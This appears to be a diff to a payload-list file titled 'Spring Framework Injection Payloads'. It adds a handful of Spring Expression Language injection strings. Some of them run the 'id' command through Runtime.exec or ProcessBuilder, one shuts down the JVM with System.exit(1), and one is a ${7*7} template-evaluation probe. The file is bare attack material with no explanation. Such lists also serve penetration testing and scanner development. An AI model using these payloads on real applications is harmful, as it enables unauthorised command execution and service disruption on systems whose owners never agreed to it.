@@ -1,2 +1,8 @@
--e # spring Payload 16
+# Spring Framework Injection Payloads
 # Version: 1.0.15-20260301-Minggu-1621-WIB
+
+T(java.lang.Runtime).getRuntime().exec('id')
+T(java.lang.System).exit(1)
+${7*7}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+new java.lang.ProcessBuilder('id').start()
